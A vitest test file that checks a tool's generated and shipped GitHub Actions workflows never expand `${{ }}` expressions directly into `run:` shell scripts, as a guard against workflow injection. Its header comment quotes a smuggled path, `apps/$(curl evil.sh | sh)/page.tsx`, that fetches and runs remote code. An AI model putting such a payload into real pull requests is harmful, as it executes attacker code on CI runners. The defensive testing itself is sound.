import { promises as fs } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { load } from 'js-yaml';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { runInit } from './run-init';

/**
 * GitHub Actions substitutes `${{ … }}` textually into a `run:` script *before* the shell
 * parses it, so any expression whose value a pull request controls is arbitrary code on the
 * runner. `warden analyze` produces exactly such a value: `test_tags` is built from the changed
 * files' own paths, so a PR adding `apps/$(curl evil.sh | sh)/page.tsx` used to land that text
 * inside the selective tier's command line. Untrusted values must reach the shell through
 * `env:` — an environment variable is data the shell never re-parses.
 */

const REPO_ROOT = path.resolve(fileURLToPath(new URL('.', import.meta.url)), '../../..');

/** A `${{ … }}` expression that a workflow expands into a shell script. */
interface RunInterpolation {
  job: string;
  step: string;
  expression: string;
}

interface WorkflowStep {
  name?: string;
  id?: string;
  uses?: string;
  run?: unknown;
}

/**
 * Every `${{ … }}` an actual `run:` script would have expanded into it. Deliberately blind to
 * whether the expression *looks* safe: a reviewer cannot tell `github.sha` from
 * `needs.analyze.outputs.test_tags` at a glance, which is how the injection got in.
 */
function runInterpolations(yaml: string): RunInterpolation[] {
  const doc = load(yaml) as { jobs?: Record<string, { steps?: WorkflowStep[] }> };
  const found: RunInterpolation[] = [];

  for (const [jobName, job] of Object.entries(doc.jobs ?? {})) {
    for (const [index, step] of (job.steps ?? []).entries()) {
      if (typeof step.run !== 'string') continue;
      for (const match of step.run.matchAll(/\$\{\{[^}]*\}\}/g)) {
        found.push({
          job: jobName,
          step: step.name ?? step.id ?? `step ${index}`,
          expression: match[0],
        });
      }
    }
  }
  return found;
}

describe('workflows Warden ships, scaffolds, or runs', () => {
  let dir: string;

  beforeEach(async () => {
    dir = await fs.mkdtemp(path.join(tmpdir(), 'warden-workflow-injection-'));
  });

  afterEach(async () => {
    await fs.rm(dir, { recursive: true, force: true });
  });

  it('never expands a workflow expression into a run: shell in the scaffolded ai-qa.yml', async () => {
    const { workflowPath } = await runInit({ cwd: dir });
    const yaml = await fs.readFile(workflowPath, 'utf-8');

    expect(runInterpolations(yaml)).toEqual([]);
  });

  it('passes the PR-derived test tags to the selective tier as an environment variable', async () => {
    const { workflowPath } = await runInit({ cwd: dir });
    const yaml = await fs.readFile(workflowPath, 'utf-8');
    const doc = load(yaml) as {
      jobs: Record<string, { steps: Array<{ run?: string; env?: Record<string, string> }> }>;
    };

    const step = doc.jobs.selective.steps.find((s) => s.run?.includes('warden run'));
    expect(step).toBeDefined();
    // The tag string is a shell *value*, never a shell *word*: quoted expansion of a variable
    // whose contents bash does not re-scan for command substitution.
    expect(step?.env?.TEST_TAGS).toBe('${{ needs.analyze.outputs.test_tags }}');
    expect(step?.run).toContain('--grep "$TEST_TAGS"');
  });

  it('never expands a workflow expression into a run: shell in the shipped example workflow', async () => {
    const yaml = await fs.readFile(
      path.join(REPO_ROOT, 'packages/github-action/ai-qa.example.yml'),
      'utf-8',
    );

    expect(runInterpolations(yaml)).toEqual([]);
  });

  it("never expands a workflow expression into a run: shell in Warden's own workflows", async () => {
    const dirPath = path.join(REPO_ROOT, '.github/workflows');
    const names = (await fs.readdir(dirPath)).filter((n) => /\.ya?ml$/.test(n));
    expect(names.length).toBeGreaterThan(0);

    const offenders: Array<RunInterpolation & { workflow: string }> = [];
    for (const name of names) {
      const yaml = await fs.readFile(path.join(dirPath, name), 'utf-8');
      offenders.push(...runInterpolations(yaml).map((hit) => ({ workflow: name, ...hit })));
    }

    expect(offenders).toEqual([]);
  });
});
